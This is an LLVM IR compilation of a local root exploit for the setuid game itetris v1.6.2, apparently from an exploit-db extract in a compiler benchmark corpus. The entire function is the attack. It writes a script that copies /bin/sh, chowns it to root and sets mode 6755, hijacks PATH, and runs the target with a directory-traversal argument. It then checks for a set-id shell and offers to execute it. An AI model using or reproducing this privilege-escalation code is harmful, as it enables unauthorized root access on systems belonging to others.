; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20517.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20517.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i32 }

@stderr = common dso_local global i32* null, align 8
@.str = private unnamed_addr constant [69 x i8] c"[ (*)itetris[v1.6.2] local root exploit, by: v9[v9@fakehalo.org]. ]\0A\00", align 1
@.str.1 = private unnamed_addr constant [46 x i8] c"[*] checking %s for proper file permissions.\0A\00", align 1
@PATH = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [40 x i8] c"[!] failed, %s doesnt appear to exist.\0A\00", align 1
@.str.3 = private unnamed_addr constant [36 x i8] c"[*] done, %s appears to be setuid.\0A\00", align 1
@.str.4 = private unnamed_addr constant [45 x i8] c"[!] failed, %s doesn't appear to be setuid.\0A\00", align 1
@.str.5 = private unnamed_addr constant [35 x i8] c"[*] done, making temporary files.\0A\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"%s/%s\00", align 1
@APPENDPATH = common dso_local global i8* null, align 8
@FAKEFILE = common dso_local global i8* null, align 8
@EXECFILE = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.8 = private unnamed_addr constant [11 x i8] c"#!/bin/sh\0A\00", align 1
@.str.9 = private unnamed_addr constant [15 x i8] c"cp /bin/sh %s\0A\00", align 1
@SUIDSHELL = common dso_local global i8* null, align 8
@.str.10 = private unnamed_addr constant [14 x i8] c"chown 0.0 %s\0A\00", align 1
@.str.11 = private unnamed_addr constant [15 x i8] c"chmod 6755 %s\0A\00", align 1
@.str.12 = private unnamed_addr constant [47 x i8] c"[*] done, setting up environment variable(s).\0A\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"%s:%s\00", align 1
@.str.14 = private unnamed_addr constant [5 x i8] c"PATH\00", align 1
@.str.15 = private unnamed_addr constant [56 x i8] c"[*] done, launching %s. (the screen may blink locally)\0A\00", align 1
@.str.16 = private unnamed_addr constant [44 x i8] c"%s -VE -F../../../../%s/%s 1>/dev/null 2>&1\00", align 1
@.str.17 = private unnamed_addr constant [40 x i8] c"[*] done, cleaning up temporary files.\0A\00", align 1
@.str.18 = private unnamed_addr constant [52 x i8] c"[*] done, checking %s for proper file permissions.\0A\00", align 1
@.str.19 = private unnamed_addr constant [39 x i8] c"[*] success! %s appears to be set*id.\0A\00", align 1
@.str.20 = private unnamed_addr constant [45 x i8] c"[!] failed, %s doesn't appear to be set*id.\0A\00", align 1
@.str.21 = private unnamed_addr constant [51 x i8] c"[?] do you wish to enter the rootshell now(y/n)?: \00", align 1
@.str.22 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.23 = private unnamed_addr constant [36 x i8] c"[*] aborted, the rootshell is: %s.\0A\00", align 1
@.str.24 = private unnamed_addr constant [38 x i8] c"[*] ok, executing rootshell(%s) now.\0A\00", align 1
@.str.25 = private unnamed_addr constant [35 x i8] c"[*] exiting program successfully.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [256 x i8], align 16
  %3 = alloca [256 x i8], align 16
  %4 = alloca [256 x i8], align 16
  %5 = alloca [1024 x i8], align 16
  %6 = alloca [0 x i8], align 1
  %7 = alloca %struct.stat, align 4
  %8 = alloca %struct.stat, align 4
  %9 = alloca i32*, align 8
  %10 = alloca i32*, align 8
  store i32 0, i32* %1, align 4
  %11 = load i32*, i32** @stderr, align 8
  %12 = call i32 (i32*, i8*, ...) @fprintf(i32* %11, i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str, i64 0, i64 0))
  %13 = load i32*, i32** @stderr, align 8
  %14 = load i8*, i8** @PATH, align 8
  %15 = call i32 (i32*, i8*, ...) @fprintf(i32* %13, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.1, i64 0, i64 0), i8* %14)
  %16 = load i8*, i8** @PATH, align 8
  %17 = call i64 @stat(i8* %16, %struct.stat* %7)
  %18 = icmp ne i64 %17, 0
  br i1 %18, label %19, label %24

19:                                               ; preds = %0
  %20 = load i32*, i32** @stderr, align 8
  %21 = load i8*, i8** @PATH, align 8
  %22 = call i32 (i32*, i8*, ...) @fprintf(i32* %20, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.2, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 1) #3
  unreachable

24:                                               ; preds = %0
  %25 = getelementptr inbounds %struct.stat, %struct.stat* %7, i32 0, i32 0
  %26 = load i32, i32* %25, align 4
  %27 = icmp eq i32 %26, 35309
  br i1 %27, label %28, label %32

28:                                               ; preds = %24
  %29 = load i32*, i32** @stderr, align 8
  %30 = load i8*, i8** @PATH, align 8
  %31 = call i32 (i32*, i8*, ...) @fprintf(i32* %29, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.3, i64 0, i64 0), i8* %30)
  br label %37

32:                                               ; preds = %24
  %33 = load i32*, i32** @stderr, align 8
  %34 = load i8*, i8** @PATH, align 8
  %35 = call i32 (i32*, i8*, ...) @fprintf(i32* %33, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.4, i64 0, i64 0), i8* %34)
  %36 = call i32 @exit(i32 1) #3
  unreachable

37:                                               ; preds = %28
  br label %38

38:                                               ; preds = %37
  %39 = load i32*, i32** @stderr, align 8
  %40 = call i32 (i32*, i8*, ...) @fprintf(i32* %39, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.5, i64 0, i64 0))
  %41 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 0
  %42 = load i8*, i8** @APPENDPATH, align 8
  %43 = load i8*, i8** @FAKEFILE, align 8
  %44 = call i32 (i8*, i32, i8*, i8*, i8*, ...) @snprintf(i8* %41, i32 256, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i8* %42, i8* %43)
  %45 = getelementptr inbounds [256 x i8], [256 x i8]* %3, i64 0, i64 0
  %46 = load i8*, i8** @APPENDPATH, align 8
  %47 = load i8*, i8** @EXECFILE, align 8
  %48 = call i32 (i8*, i32, i8*, i8*, i8*, ...) @snprintf(i8* %45, i32 256, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i8* %46, i8* %47)
  %49 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 0
  %50 = call i32 @unlink(i8* %49)
  %51 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 0
  %52 = call i32* @fopen(i8* %51, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  store i32* %52, i32** %10, align 8
  %53 = load i32*, i32** %10, align 8
  %54 = call i32 @fclose(i32* %53)
  %55 = getelementptr inbounds [256 x i8], [256 x i8]* %3, i64 0, i64 0
  %56 = call i32 @unlink(i8* %55)
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %3, i64 0, i64 0
  %58 = call i32* @fopen(i8* %57, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  store i32* %58, i32** %9, align 8
  %59 = load i32*, i32** %9, align 8
  %60 = call i32 (i32*, i8*, ...) @fprintf(i32* %59, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.8, i64 0, i64 0))
  %61 = load i32*, i32** %9, align 8
  %62 = load i8*, i8** @SUIDSHELL, align 8
  %63 = call i32 (i32*, i8*, ...) @fprintf(i32* %61, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i64 0, i64 0), i8* %62)
  %64 = load i32*, i32** %9, align 8
  %65 = load i8*, i8** @SUIDSHELL, align 8
  %66 = call i32 (i32*, i8*, ...) @fprintf(i32* %64, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.10, i64 0, i64 0), i8* %65)
  %67 = load i32*, i32** %9, align 8
  %68 = load i8*, i8** @SUIDSHELL, align 8
  %69 = call i32 (i32*, i8*, ...) @fprintf(i32* %67, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0), i8* %68)
  %70 = load i32*, i32** %9, align 8
  %71 = call i32 @fclose(i32* %70)
  %72 = getelementptr inbounds [256 x i8], [256 x i8]* %3, i64 0, i64 0
  %73 = call i32 @chmod(i8* %72, i32 33261)
  %74 = load i32*, i32** @stderr, align 8
  %75 = call i32 (i32*, i8*, ...) @fprintf(i32* %74, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.12, i64 0, i64 0))
  %76 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %77 = load i8*, i8** @APPENDPATH, align 8
  %78 = call i8* @getenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i64 0, i64 0))
  %79 = call i32 (i8*, i32, i8*, i8*, i8*, ...) @snprintf(i8* %76, i32 1024, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i64 0, i64 0), i8* %77, i8* %78)
  %80 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %81 = call i32 @setenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i64 0, i64 0), i8* %80, i32 1)
  %82 = load i32*, i32** @stderr, align 8
  %83 = load i8*, i8** @PATH, align 8
  %84 = call i32 (i32*, i8*, ...) @fprintf(i32* %82, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.15, i64 0, i64 0), i8* %83)
  %85 = call i32 @sleep(i32 1)
  %86 = getelementptr inbounds [256 x i8], [256 x i8]* %2, i64 0, i64 0
  %87 = load i8*, i8** @PATH, align 8
  %88 = load i8*, i8** @APPENDPATH, align 8
  %89 = load i8*, i8** @FAKEFILE, align 8
  %90 = call i32 (i8*, i32, i8*, i8*, i8*, ...) @snprintf(i8* %86, i32 256, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.16, i64 0, i64 0), i8* %87, i8* %88, i8* %89)
  %91 = getelementptr inbounds [256 x i8], [256 x i8]* %2, i64 0, i64 0
  %92 = call i32 @system(i8* %91)
  %93 = load i32*, i32** @stderr, align 8
  %94 = call i32 (i32*, i8*, ...) @fprintf(i32* %93, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.17, i64 0, i64 0))
  %95 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 0
  %96 = call i32 @unlink(i8* %95)
  %97 = getelementptr inbounds [256 x i8], [256 x i8]* %3, i64 0, i64 0
  %98 = call i32 @unlink(i8* %97)
  %99 = load i32*, i32** @stderr, align 8
  %100 = load i8*, i8** @SUIDSHELL, align 8
  %101 = call i32 (i32*, i8*, ...) @fprintf(i32* %99, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.18, i64 0, i64 0), i8* %100)
  %102 = load i8*, i8** @SUIDSHELL, align 8
  %103 = call i64 @stat(i8* %102, %struct.stat* %8)
  %104 = icmp ne i64 %103, 0
  br i1 %104, label %105, label %110

105:                                              ; preds = %38
  %106 = load i32*, i32** @stderr, align 8
  %107 = load i8*, i8** @SUIDSHELL, align 8
  %108 = call i32 (i32*, i8*, ...) @fprintf(i32* %106, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.2, i64 0, i64 0), i8* %107)
  %109 = call i32 @exit(i32 1) #3
  unreachable

110:                                              ; preds = %38
  %111 = getelementptr inbounds %struct.stat, %struct.stat* %8, i32 0, i32 0
  %112 = load i32, i32* %111, align 4
  %113 = icmp eq i32 %112, 36333
  br i1 %113, label %114, label %118

114:                                              ; preds = %110
  %115 = load i32*, i32** @stderr, align 8
  %116 = load i8*, i8** @SUIDSHELL, align 8
  %117 = call i32 (i32*, i8*, ...) @fprintf(i32* %115, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.19, i64 0, i64 0), i8* %116)
  br label %123

118:                                              ; preds = %110
  %119 = load i32*, i32** @stderr, align 8
  %120 = load i8*, i8** @SUIDSHELL, align 8
  %121 = call i32 (i32*, i8*, ...) @fprintf(i32* %119, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.20, i64 0, i64 0), i8* %120)
  %122 = call i32 @exit(i32 1) #3
  unreachable

123:                                              ; preds = %114
  br label %124

124:                                              ; preds = %123
  %125 = load i32*, i32** @stderr, align 8
  %126 = call i32 (i32*, i8*, ...) @fprintf(i32* %125, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.21, i64 0, i64 0))
  %127 = getelementptr inbounds [0 x i8], [0 x i8]* %6, i64 0, i64 0
  %128 = call i32 @scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.22, i64 0, i64 0), i8* %127)
  %129 = getelementptr inbounds [0 x i8], [0 x i8]* %6, i64 0, i64 0
  %130 = load i8, i8* %129, align 1
  %131 = sext i8 %130 to i32
  %132 = icmp ne i32 %131, 89
  br i1 %132, label %133, label %141

133:                                              ; preds = %124
  %134 = getelementptr inbounds [0 x i8], [0 x i8]* %6, i64 0, i64 0
  %135 = load i8, i8* %134, align 1
  %136 = sext i8 %135 to i32
  %137 = icmp ne i32 %136, 121
  br i1 %137, label %138, label %141

138:                                              ; preds = %133
  %139 = load i8*, i8** @SUIDSHELL, align 8
  %140 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.23, i64 0, i64 0), i8* %139)
  br label %147

141:                                              ; preds = %133, %124
  %142 = load i8*, i8** @SUIDSHELL, align 8
  %143 = call i32 @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.24, i64 0, i64 0), i8* %142)
  %144 = load i8*, i8** @SUIDSHELL, align 8
  %145 = load i8*, i8** @SUIDSHELL, align 8
  %146 = call i32 @execl(i8* %144, i8* %145, i32 0)
  br label %147

147:                                              ; preds = %141, %138
  %148 = load i32*, i32** @stderr, align 8
  %149 = call i32 (i32*, i8*, ...) @fprintf(i32* %148, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.25, i64 0, i64 0))
  %150 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @fprintf(i32*, i8*, ...) #1

declare dso_local i64 @stat(i8*, %struct.stat*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, i8*, ...) #1

declare dso_local i32 @unlink(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @chmod(i8*, i32) #1

declare dso_local i8* @getenv(i8*) #1

declare dso_local i32 @setenv(i8*, i8*, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @scanf(i8*, i8*) #1

declare dso_local i32 @printf(i8*, i8*) #1

declare dso_local i32 @execl(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
